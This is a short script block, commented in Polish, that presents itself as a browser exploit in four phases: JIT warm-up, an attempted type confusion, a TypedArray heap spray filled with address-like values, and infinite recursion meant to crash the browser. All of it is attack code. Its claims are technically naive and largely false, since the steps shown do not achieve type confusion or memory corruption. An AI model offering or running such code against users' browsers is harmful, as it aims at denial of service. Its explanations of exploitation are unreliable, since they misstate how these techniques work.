<script>
    var spray = [];
    
    // Funkcja, która ma oszukać optymalizator (JIT)
    function optimizeMe(obj) {
        return obj.x + 1;
    }

    function runPowerfulExploit() {
        print("Faza 1: Rozgrzewanie procesora (JIT Spray)...");
        
        // Wykonujemy funkcję 10 000 razy, żeby przeglądarka ją "zoptymalizowała"
        let testObj = { x: 1 };
        for(let i = 0; i < 10000; i++) {
            optimizeMe(testObj);
        }

        print("Faza 2: Próba wywołania Type Confusion...");
        // Nagle zmieniamy strukturę obiektu - JIT może się pogubić
        testObj = { x: 1, y: 2 }; 
        optimizeMe(testObj);

        print("Faza 3: Agresywne uderzenie w TypedArrays...");
        
        try {
            for(let i = 0; i < 500; i++) {
                // Tworzymy ogromne bufory, które nakładają się na siebie
                let buffer = new ArrayBuffer(0x1000); 
                let view = new Float64Array(buffer); // Float64 używa 8 bajtów, co ułatwia trafienie w adresy
                
                // Wypełniamy "magiczną" liczbą, która w HEX wygląda jak adresy pamięci
                view.fill(1.123456789e-308); 
                spray.push(view);
            }
        } catch(e) {
            print("Błąd alokacji: " + e.message, "critical");
        }

        print("Faza 4: Wyzwalanie rekurencji...");
        function boom() {
            boom(); // To powinno "zabić" proces przeglądarki
        }
        
        setTimeout(() => {
            print("OSTATNIA PRÓBA: Crash stosu...");
            boom();
        }, 1000);
    }
</script>
